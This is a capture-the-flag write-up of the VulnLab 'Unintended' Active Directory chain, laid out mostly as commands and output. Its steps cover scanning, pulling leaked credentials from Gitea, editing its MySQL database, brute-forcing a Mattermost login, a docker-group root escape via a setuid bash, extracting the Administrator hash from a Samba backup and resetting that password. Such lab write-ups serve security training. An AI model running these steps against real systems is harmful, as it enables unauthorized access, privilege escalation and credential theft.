---
title: VulnLab Unintended
description: VulnLab Unintended
image:
  path: unintended.png
categories:
- VulnLab Chains
- Active Directory
layout: post
media_subpath: /assets/posts/labs/vulnlab/chains/unintended
tags:
- vulnlab-chains
- active-directory
---

# Unintended
## Recon
```
└─$ rustscan -a 10.10.178.133,10.10.178.134,10.10.178.135 -r 1-65535 -g                              
10.10.178.134 -> [22,80,8065,8200]
10.10.178.135 -> [21,22]
10.10.178.133 -> [22,53,88,135,139,389,464,636,3269,3268]
```
```
└─$ nmap -sC -sV -p22,53,88,135,139,389,464,636,3269,3268 10.10.178.133                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-10 00:03 +06
Nmap scan report for 10.10.178.133
Host is up (0.092s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
53/tcp   open  domain       (generic dns response: NOTIMP)
88/tcp   open  kerberos-sec (server time: 2025-05-09 18:02:11Z)
| fingerprint-strings: 
|   Kerberos: 
|     d~b0`
|     20250509180211Z
|     krbtgt
|_    client in request
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Samba smbd 4.6.2
389/tcp  open  ldap         (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap     (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap         (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap     (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.94SVN%I=7%D=5/10%Time=681E4388%P=x86_64-pc-linux-gnu%r(D
SF:NSStatusRequestTCP,E,"\0\x0c\0\0\x90\x04\0\0\0\0\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port88-TCP:V=7.94SVN%I=7%D=5/10%Time=681E4383%P=x86_64-pc-linux-gnu%r(K
SF:erberos,68,"\0\0\0d~b0`\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11
SF:\x18\x0f20250509180211Z\xa5\x05\x02\x03\x06\xc6\xf2\xa6\x03\x02\x01\x06
SF:\xa9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x01\0\xa1\x0e0\x0c\x1b\x06k
SF:rbtgt\x1b\x02NM\xab\x16\x1b\x14No\x20client\x20in\x20request");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: b0:aa:30:47:12:7f (unknown)
| smb2-time: 
|   date: 2025-05-09T18:03:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.30 seconds
```
```
└─$ nmap -sC -sV -p21,22 10.10.178.135                                                                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-10 00:05 +06
Nmap scan report for 10.10.178.135
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.7
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.10.178.135:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.79 seconds

```
```
└─$ nmap -sC -sV -p22,80,8065,8200 10.10.178.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-10 00:06 +06
Nmap scan report for 10.10.178.134
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Under Construction
|_http-server-header: Werkzeug/3.0.1 Python/3.11.8
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3132
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com js.stripe.com/v3
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Fri, 09 May 2025 18:00:47 GMT
|     Permissions-Policy: 
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: d6bsuye3njnxtm1rtey1bcu1re
|     X-Version-Id: 7.8.15.7.8.15.a67209e3f9507a23537760d9453206d5.false
|     Date: Fri, 09 May 2025 18:04:39 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Fri, 09 May 2025 18:04:39 GMT
|_    Content-Length: 0
8200/tcp open  http    Duplicati httpserver
|_http-server-header: Tiny WebServer
| http-title: Duplicati Login
|_Requested resource was /login.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.94SVN%I=7%D=5/10%Time=681E4412%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,E71,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20publ
SF:ic\r\nContent-Length:\x203132\r\nContent-Security-Policy:\x20frame-ance
SF:stors\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\x20js\
SF:.stripe\.com/v3\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLast
SF:-Modified:\x20Fri,\x2009\x20May\x202025\x2018:00:47\x20GMT\r\nPermissio
SF:ns-Policy:\x20\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Request-Id:\x20
SF:d6bsuye3njnxtm1rtey1bcu1re\r\nX-Version-Id:\x207\.8\.15\.7\.8\.15\.a672
SF:09e3f9507a23537760d9453206d5\.false\r\nDate:\x20Fri,\x2009\x20May\x2020
SF:25\x2018:04:39\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><he
SF:ad><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport\"\x20content=\"w
SF:idth=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"><me
SF:ta\x20name=\"robots\"\x20content=\"noindex,\x20nofollow\"><meta\x20name
SF:=\"referrer\"\x20content=\"no-referrer\"><title>Mattermost</title><meta
SF:\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"><meta\x20name")%
SF:r(HTTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:
SF:\x20Fri,\x2009\x20May\x202025\x2018:04:39\x20GMT\r\nContent-Length:\x20
SF:0\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCoo
SF:kie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Service Info: Host: web.unintended.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.71 seconds

```

Enumerate shares on DC

```
└─$ nxc smb 10.10.178.133 -u '' -p '' --shares                  
SMB         10.10.178.133   445    DC               [*] Unix - Samba x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.178.133   445    DC               [+] unintended.vl\: 
SMB         10.10.178.133   445    DC               [*] Enumerated shares
SMB         10.10.178.133   445    DC               Share           Permissions     Remark
SMB         10.10.178.133   445    DC               -----           -----------     ------
SMB         10.10.178.133   445    DC               sysvol                          
SMB         10.10.178.133   445    DC               netlogon                        
SMB         10.10.178.133   445    DC               home                            Home Directories
SMB         10.10.178.133   445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

Enumerate subdomains 

```
└─$ dnsenum --dnsserver 10.10.178.133 --enum unintended.vl
<SNIP>
backup.unintended.vl.                    900      IN    A        10.10.10.13                                                                                                                                                                
backup.unintended.vl.                    900      IN    A        10.10.180.23
web.unintended.vl.                       900      IN    A        10.10.10.12
web.unintended.vl.                       900      IN    A        10.10.180.22
<SNIP>

```

## web.unintended.vl
Let's continue with enumerating website. Start with vhost fuzzing
```
└─$ ffuf -u 'http://10.10.178.134' -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.unintended.vl' -fs 2864

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.178.134
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.unintended.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2864
________________________________________________

chat                    [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 86ms]
code                    [Status: 200, Size: 13653, Words: 1050, Lines: 272, Duration: 135ms]
```

We find 2 additional vhosts. After adding entries to `/etc/hosts`, we now found Gitea on http://code.unintended.vl

![](1.png)

Inside we find credentials for ftp in one of the commits

![](2.png)

```
ENV APP_SECRET 6SU28SH286DY8HS7D
ENV SFTP_USER ftp_user
ENV SFTP_PASS Th3_F1P_Account$$
```

We can't login to ftp service on backup.unintended.vl, but we can ssh to web.unintended.vl
```
└─$ ssh ftp_user@10.10.178.134
The authenticity of host '10.10.178.134 (10.10.178.134)' can't be established.
ED25519 key fingerprint is SHA256:tJleDiPxkfercfXNLxPUOfwqqwKcMI5eJC+MX30izO4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.178.134' (ED25519) to the list of known hosts.
(ftp_user@10.10.178.134) Password: 
This service allows sftp connections only.
Connection to 10.10.178.134 closed.
```

We saw that there's a `Dockerfile-mysql` in Gitea. Let's configure port forwarding to reach MySQL service
```
ssh -N ftp_user@10.10.178.134 -L 3306:127.0.0.1:3306
```

We can authenticate to MySQL using default credentials
```
└─$ mysql -h 127.0.0.1 -u root -proot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 60
Server version: 8.3.0 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```
It contains Gitea's database
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.132 sec)
```
```
MySQL [gitea]> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
<SNIP>
repository
<SNIP>
```

We find another repository, named `home-backup`, which happens to be private
```
MySQL [gitea]> select name,owner_name,description from repository;
+-------------+------------+-----------------------------------------------------------------+
| name        | owner_name | description                                                     |
+-------------+------------+-----------------------------------------------------------------+
| DevOps      | juan       | Templates and config files for automation and server management |
| home-backup | juan       | Backup for home directory in WEB                                |
+-------------+------------+-----------------------------------------------------------------+
2 rows in set (0.087 sec)
MySQL [gitea]> select name,owner_name,description,is_private from repository;
+-------------+------------+-----------------------------------------------------------------+------------+
| name        | owner_name | description                                                     | is_private |
+-------------+------------+-----------------------------------------------------------------+------------+
| DevOps      | juan       | Templates and config files for automation and server management |          0 |
| home-backup | juan       | Backup for home directory in WEB                                |          1 |
+-------------+------------+-----------------------------------------------------------------+------------+
2 rows in set (0.087 sec)

```

Let's make it public and access it
```
MySQL [gitea]> update repository set is_private = 0 where id = 7;
Query OK, 1 row affected (0.096 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [gitea]> select id,name,owner_name,description,is_private from repository;
+----+-------------+------------+-----------------------------------------------------------------+------------+
| id | name        | owner_name | description                                                     | is_private |
+----+-------------+------------+-----------------------------------------------------------------+------------+
|  2 | DevOps      | juan       | Templates and config files for automation and server management |          0 |
|  7 | home-backup | juan       | Backup for home directory in WEB                                |          0 |
+----+-------------+------------+-----------------------------------------------------------------+------------+
2 rows in set (0.092 sec)


```

![](3.png)

Inside we find a commit with bash history containing credentials for `juan`. We can use them to login via ssh to web.unintended.vl and get the flag.

![](4.png)

![](5.png)

We can use the creds to login to Mattermost, which is hosted on `http://chat.unintended.vl`

![](6.png)

Inside we find a conversation which exposes password format, which was probably used by Abbie

![](7.png)

We can create a wordlist
```
└─$ for i in {1940..2010}; do echo Abbie$i;done >> pass.txt       
     
```

Now, we can use ffuf and fuzz the password via Mattermost's API
```
└─$ ffuf -w pass.txt -u http://chat.unintended.vl/api/v4/users/login -X POST -H "Content-Type: application/json" -d '{"login_id":"abbie@unintended.vl","password":"FUZZ","token":"","deviceId":""}' -fc 401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://chat.unintended.vl/api/v4/users/login
 :: Wordlist         : FUZZ: /home/kali/vulnlab/chains/unintended/pass.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"login_id":"abbie@unintended.vl","password":"FUZZ","token":"","deviceId":""}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

<REDACTED>               [Status: 200, Size: 745, Words: 2, Lines: 2, Duration: 1454ms]
```

After authenicating as `abbie`, we find a chat with her domain password

![](8.png)

We can use the creds to login to backup.unintended.vl

![](9.png)

## backup.unintended.vl
`abbie` has `docker` group permissions
```
abbie@unintended.vl@backup:~$ groups
domain users@unintended.vl docker
```

We can elevate to root by mounting the host system and setting UID on the bash binary
```
abbie@unintended.vl@backup:~$ docker container ls
CONTAINER ID   IMAGE                COMMAND           CREATED         STATUS          PORTS     NAMES
3b4fb11f4672   python:3.11.2-slim   "sh ./setup.sh"   14 months ago   Up 52 minutes             scripts_ftp_1
abbie@unintended.vl@backup:~$ docker run -it -v /:/host/ python:3.11.2-slim chroot /host/ bash
root@6b94722a336b:/# cp /usr/bin/bash /opt/shell; chown root:root /opt/shell; chmod 4755 /opt/shell
root@6b94722a336b:/# exit
exit
abbie@unintended.vl@backup:~$ /opt/shell -p
shell-5.1# id
uid=320201104(abbie@unintended.vl) gid=320200513(domain users@unintended.vl) euid=0(root) groups=320200513(domain users@unintended.vl),119(docker)
shell-5.1# 

```

Now we get the flag and find ftp admin creds
```
shell-5.1# cat /root/scripts/ftp/setup.sh 
#!/bin/bash
pip3 install pyftpdlib==1.5.7
python3 server.py
shell-5.1# cat /root/scripts/ftp/server.py 
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()

authorizer.add_user("ftp_admin", "<REDACTED>", "/ftp/volumes/", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server_local = FTPServer(("0.0.0.0", 21), handler)

server_local.serve_forever()

```

## dc.unintended.vl
Inside `/opt/ftp`, we find domain backup files
```
shell-5.1# cd domain_backup/
shell-5.1# ls -lha
total 1.6M
drw-rw---- 2 root root 4.0K Feb 17  2024 .
drwxr-xr-x 4 root root 4.0K Jan 25  2024 ..
-rw-rw---- 1 root root 1.6M Feb 17  2024 samba-backup-2024-02-17T20-32-13.580437.tar.bz2
shell-5.1# 

```

We can download backups using `ftp_admin` creds we found
```
└─$ ftp ftp_admin@10.10.178.135                                                                                              
Connected to 10.10.178.135.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering extended passive mode (|||36851|).
125 Data connection already open. Transfer starting.
drw-rw----   2 root     root         4096 Jan 25  2024 docker_src
drw-rw----   2 root     root         4096 Feb 17  2024 domain_backup
226 Transfer complete.
ftp> cd domain_backup
250 "/domain_backup" is the current directory.
ftp> ls
229 Entering extended passive mode (|||36395|).
125 Data connection already open. Transfer starting.
-rw-rw----   1 root     root      1654914 Feb 17  2024 samba-backup-2024-02-17T20-32-13.580437.tar.bz2
226 Transfer complete.
ftp> get samba-backup-2024-02-17T20-32-13.580437.tar.bz2
local: samba-backup-2024-02-17T20-32-13.580437.tar.bz2 remote: samba-backup-2024-02-17T20-32-13.580437.tar.bz2
229 Entering extended passive mode (|||53591|).
150 File status okay. About to open data connection.
100% |***********************************************************************************************************************************************************************************************|  1616 KiB  997.65 KiB/s    00:00 ETA
226 Transfer complete.
1654914 bytes received in 00:01 (997.44 KiB/s)
ftp> exit
221 Goodbye.
```
```
└─$ tar -xvf samba-backup-2024-02-17T20-32-13.580437.tar.bz2 
sysvol.tar.gz
backup.txt
private/secrets.tdb
private/privilege.ldb
private/sam.ldb
private/dns_update_list
private/spn_update_list
private/schannel_store.tdb
private/krb5.conf
private/secrets.ldb
private/passdb.tdb
private/idmap.ldb
private/dns_update_cache
private/secrets.keytab
private/encrypted_secrets.key
private/hklm.ldb
private/share.ldb
private/tls/ca.pem
private/tls/cert.pem
private/tls/key.pem
private/sam.ldb.d/DC=DOMAINDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/metadata.tdb
private/sam.ldb.d/DC=FORESTDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=SCHEMA,CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
state/share_info.tdb
state/group_mapping.tdb
state/winbindd_cache.tdb
state/registry.tdb
state/account_policy.tdb
etc/smb.conf.bak
etc/gdbcommands
etc/smb.conf

```

There's a [conversation regarding ability to read passwords](https://groups.google.com/g/mailing.unix.samba/c/4dHV7im1v4s/m/PcmvINETivQJ?pli=1) from `sam.ldb`. Also another usefull resources:

- https://samba.tranquil.it/doc/en/samba_fundamentals/about_password_hash.html
- https://wiki.samba.org/index.php/LDB

Now, extract the password
```
└─$ ldbsearch -d 0 -H sam.ldb -b dc=unintended,dc=vl '(&(objectClass=user)(sAMAccountname=administrator))' unicodePwd
# record 1
dn: CN=Administrator,CN=Users,DC=unintended,DC=vl
unicodePwd:: <REDACTED>

# Referral
ref: ldap:///CN=Configuration,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=DomainDnsZones,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=ForestDnsZones,DC=unintended,DC=vl

# returned 4 records
# 1 entries
# 3 referrals
```

Convert it to NT

![](10.png)

We can't use the hash to login to machines via ssh, but we can change it
```
└─$ changepasswd.py unintended.vl/administrator@dc.unintended.vl -hashes :<REDACTED> -newpass 'P@ssw0rd!!!'                                                         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of unintended.vl\administrator
[*] Connecting to DCE/RPC as unintended.vl\administrator
[*] Password was changed successfully.

```
Now, login via SMB and get the flag
```
└─$ smbclient.py unintended.vl/administrator:'P@ssw0rd!!!'@dc.unintended.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
sysvol
netlogon
home
IPC$
# use home
# ls
drw-rw-rw-          0  Sat Mar 30 14:37:08 2024 .
drw-rw-rw-          0  Sun Feb 25 02:13:16 2024 ..
-rw-rw-rw-        807  Sun Feb 25 02:13:16 2024 .profile
drw-rw-rw-          0  Sun Feb 25 02:13:16 2024 .cache
-rw-rw-rw-       3771  Sun Feb 25 02:13:16 2024 .bashrc
-rw-rw-rw-        220  Sun Feb 25 02:13:16 2024 .bash_logout
-rw-rw-rw-         37  Sat Mar 30 14:37:08 2024 root.txt
# 

```

[https://api.vulnlab.com/api/v1/share?id=a6f2ea4d-77d8-46b0-94af-4caeeaad2422](https://api.vulnlab.com/api/v1/share?id=a6f2ea4d-77d8-46b0-94af-4caeeaad2422)


## Bonus
The chain also contains another flag in web.unintended.vl. To get the flag, check these 2 awesome blogs:

- https://blog.apolloteapot.com/vulnlab-unintended
- https://notes.secure77.de/WriteUps/VulnLab/Unintended/Writeup